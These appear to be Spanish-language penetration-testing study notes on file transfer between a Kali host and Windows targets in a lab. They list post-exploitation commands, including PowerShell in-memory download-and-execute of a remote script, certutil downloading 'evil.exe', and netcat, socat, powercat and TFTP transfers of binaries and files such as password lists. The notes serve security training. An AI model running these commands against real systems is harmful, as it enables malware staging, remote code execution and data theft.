# File Transfers

Propietario: Adrian Gisbert Cabello

### 1. Consideraciones y Preparaciones

### Dangers of Transferring Attack Tools

- **Riesgos**:
    - Abuso por parte de terceros malintencionados.
    - Detección por software antivirus.
- **Recomendación**: Usar herramientas nativas cuando sea posible y documentar las subidas de archivos.

### Instalación de Pure-FTPd

```bash
sudo apt update && sudo apt install pure-ftpd
```

- **Crear un nuevo usuario para Pure-FTPd**:
    
    ```bash
    sudo pure-pw useradd offsec -u ftpuser -d /home/ftpusers/offsec
    sudo pure-pw mkdb
    ```
    

### Uso de FTP

- **Conexión FTP básica**:
    
    ```bash
    ftp 10.11.0.4
    ```
    

### 2. Métodos de Transferencia de Archivos en Windows

### Non-Interactive FTP Download

- **Comando FTP en Windows**:
    
    ```bash
    ftp -s:script.txt
    ```
    
    - `script.txt` contiene comandos FTP como `open`, `user`, `get`, etc.

### Uso de PowerShell para Descarga de Archivos

- **Descargar un archivo**:
    
    ```powershell
    powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.11.0.4/file.exe','C:\path\to\save\file.exe')"
    ```
    

### Transferencias con Powercat

- **Enviar un archivo con Powercat**:
    
    ```powershell
    powercat -c 10.11.0.4 -p 443 -i C:\path\to\file.exe
    ```
    

### Transferencias con Netcat

- **Enviar un archivo desde Kali a Windows**:
    - **En Windows** (escuchando):
        
        ```bash
        nc -nlvp 4444 > incoming.exe
        ```
        
    - **En Kali** (enviando):
        
        ```bash
        nc -nv 10.11.0.22 4444 < /usr/share/windows-resources/binaries/wget.exe
        ```
        

### Uso de Socat para Transferencias

- **Enviar un archivo con Socat**:
    - **En Kali**:
        
        ```bash
        socat TCP4-LISTEN:443,fork file:secret_passwords.txt
        ```
        
    - **En Windows**:
        
        ```bash
        socat TCP4:10.11.0.4:443 file:received_secret_passwords.txt,create
        ```
        

### Descarga y Ejecución de Script con PowerShell

- **Ejecutar un script remoto directamente desde memoria**:
    
    ```powershell
    powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('http://10.11.0.4/script.ps1')
    ```
    

### Uso de TFTP

- **Configuración de TFTP en Kali**:
    
    ```bash
    sudo apt update && sudo apt install atftp
    sudo mkdir /tftp
    sudo chown nobody: /tftp
    sudo atftpd --daemon --port 69 /tftp
    ```
    
- **Subir un archivo desde Windows**:
    
    ```bash
    tftp -i 10.11.0.4 put important.docx
    ```
    

### Uso de Certutil para Descargas

- **Descargar un archivo con certutil**:
    
    ```bash
    certutil.exe -urlcache -f http://10.11.0.4/evil.exe C:\path\to\save\evil.exe
    ```
    

### Ejemplos Prácticos

### 1. Transferencia de Archivos con PowerShell

- **Descargar wget.exe en Windows**:
    
    ```powershell
    powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.11.0.4/wget.exe','C:\Users\offsec\Desktop\wget.exe')"
    ```
    

### 2. Transferencia de Archivos con Netcat

- **En Windows (recibiendo el archivo)**:
    
    ```bash
    nc -nlvp 4444 > incoming.exe
    ```
    
- **En Kali (enviando el archivo)**:
    
    ```bash
    nc -nv 10.11.0.22 4444 < /usr/share/windows-resources/binaries/wget.exe
    ```
    

### 3. Transferencia de Archivos con Socat

- **En Kali**:
    
    ```bash
    socat TCP4-LISTEN:443,fork file:secret_passwords.txt
    ```
    
- **En Windows**:
    
    ```bash
    socat TCP4:10.11.0.4:443 file:received_secret_passwords.txt,create
    ```